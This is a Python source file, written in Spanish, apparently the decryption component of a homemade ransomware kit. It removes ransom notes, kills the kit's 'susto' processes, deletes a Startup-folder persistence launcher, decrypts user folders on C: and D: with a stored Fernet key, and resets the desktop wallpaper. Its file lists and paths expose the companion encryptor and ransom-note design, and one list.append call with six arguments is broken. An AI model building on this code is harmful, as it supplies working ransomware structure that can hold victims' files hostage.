from cryptography.fernet import Fernet
import os,getpass,ctypes
nomelotoques=["key.key","lanzador.exe","encrypt.exe","decrypt.exe","documentointeresante.docx","noesunvirusvenom.exe","susto.exe","ransomdetalles.txt","ohno.mp3","fondohack.jpg"]
def load_key():
    return open('C:\\Users\\'+getpass.getuser()+'\\Documents\\key.key', 'rb').read()
def decrypt(item, key):
    f = Fernet(key)
    try:
        with open(item,'rb') as file:
            encrypted_data = file.read()
        
            decrypted_data = f.decrypt(encrypted_data)

        with open(item, 'wb') as file:
            file.write(decrypted_data)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    usuario=getpass.getuser()
    if os.path.exists("C:\\Users\\"+usuario+"\\Desktop\\victima"):
        pruebaono="\\Desktop\\victima"
    else:
        pruebaono=""
    docs = 'C:\\Users\\'+usuario+pruebaono+'\\Documents'
    music = 'C:\\Users\\'+usuario+pruebaono+'\\Music'
    pictures = 'C:\\Users\\'+usuario+pruebaono+'\\Pictures'
    videos = 'C:\\Users\\'+usuario+pruebaono+'\\Videos'
    downloads= 'C:\\Users\\'+usuario+pruebaono+'\\Downloads'
    desktop= 'C:\\Users\\'+usuario+pruebaono+'\\Desktop'
    carpetasAencriptar=[docs,music,pictures,videos,downloads,desktop]
    try:
        os.listdir("D:\\Users")
        ddocs = 'D:\\Users\\'+usuario+pruebaono+'\\Documents'
        dmusic = 'D:\\Users\\'+usuario+pruebaono+'\\Music'
        dpictures = 'D:\\Users\\'+usuario+pruebaono+'\\Pictures'
        dvideos = 'D:\\Users\\'+usuario+pruebaono+'\\Videos'
        ddownloads= 'D:\\Users\\'+usuario+pruebaono+'\\Downloads'
        ddesktop= 'D:\\Users\\'+usuario+pruebaono+'\\Desktop'
        carpetasAencriptar.append(ddocs,dmusic,dpictures,dvideos,ddownloads,ddesktop)
    except:
        pass
    for carpeta in carpetasAencriptar:
        try:
            os.remove(carpeta+'\\'+'rescate.txt')
        except:
            print("no se borró ",carpeta,'\\','rescate.txt')
    try:
        os.remove(docs+"\\ransomdetalles.txt")
    except:
        print("no se borró ",docs,'\\','ransomdetalles.txt')
    os.system("taskkill /f /im launchersusto.exe")
    os.system("taskkill /f /im susto.exe")
    try:
        os.remove("C:\\Users\\"+usuario+"\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launchersusto.exe")
    except:
        print("no se borró startup")
    key = load_key()
    for carpeta in carpetasAencriptar:
        for ruta, directorios, archivos in os.walk(carpeta):
            for archivo in archivos:
                if archivo not in nomelotoques:
                    archivo_ruta = os.path.join(ruta, archivo)
                    decrypt(archivo_ruta,key)
    try:
        os.remove(docs+"\\key.key")
    except:
        print("no hay llave")
    try:
        os.remove(docs+"\\ransomid.txt")
    except:
        print("no hay ransomid")
    print(ctypes.windll.user32.SystemParametersInfoW(20,0,docs+"\\fondobak.jpg", 0))